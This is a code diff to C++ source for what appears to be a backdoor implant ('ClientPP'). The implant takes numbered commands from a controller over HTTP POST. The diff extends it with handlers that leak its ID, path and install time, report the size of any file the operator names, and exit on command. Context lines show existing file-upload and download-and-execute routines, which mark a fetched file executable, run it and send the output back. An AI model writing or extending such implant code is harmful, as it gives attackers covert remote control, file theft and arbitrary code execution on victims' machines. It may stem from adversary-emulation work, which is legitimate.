@@ -79,6 +79,16 @@ namespace client {
         }
 
     }
+
+    int getFileSize(std::string path) {
+        struct stat stat_buf;
+        int rc = stat(path.c_str(), &stat_buf);
+        if (rc == 0) {
+            return static_cast<int>(stat_buf.st_size);
+        } else {
+            return -1;
+        }
+    }
 }
 
 bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
@@ -188,8 +198,8 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
                 std::cout << "[IMPLANT] Read file for upload failed" << std::endl;
             }
             else {
-                unsigned char execute_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
-                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, execute_instruction, c->strClientID);
+                unsigned char upload_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
+                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, upload_instruction, c->strClientID);
             }
         }
         else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
@@ -223,11 +233,33 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
                 std::cout << "[IMPLANT] Download failed" << std::endl;
             }
             else {
-                unsigned char instruction[] = {dwCommand, 0x00, 0x00, 0x00};
+                unsigned char download_exec_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
                 std::string output_path = c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME;
                 std::string output = client::executeCmd("chmod 755 " + output_path + "; " + output_path);
-                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), instruction, c->strClientID);
+                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), download_exec_instruction, c->strClientID);
             }
+        }
+        else if (dwCommand == 0x07) {
+            // get config info
+            std::cout << "[IMPLANT] Received get config info instruction" << std::endl;
+            unsigned char get_config_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
+            std::string config_info = "Config Info:\nID: " + c->strClientID + "\nPath: " + c->pathProcess + "\nInstall Time: " + std::to_string(c->installTime);
+            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(config_info.begin(), config_info.end()), get_config_instruction, c->strClientID);
+        }
+        else if (dwCommand == 0x33) {
+            // get a file size
+            std::cout << "[IMPLANT] Received get file size instruction" << std::endl;
+            unsigned char get_filesize_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
+            std::vector<unsigned char> path = Communication::getPayload(packet);
+            std::string path_str(path.begin(), path.end());
+            int file_size = client::getFileSize(path_str);
+            std::string file_size_str = "Size of " + std::string(path.begin(), path.end()) + ": " + std::to_string(file_size) + " bytes";
+            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(file_size_str.begin(), file_size_str.end()), get_filesize_instruction, c->strClientID);
+        }
+        else if (dwCommand == 0xe8) {
+            // exit
+            std::cout << "[IMPLANT] Received exit instruction" << std::endl;
+            exit(0);
         }
         else {
             std::cout << "[IMPLANT] Received unfamiliar instruction" << std::endl;
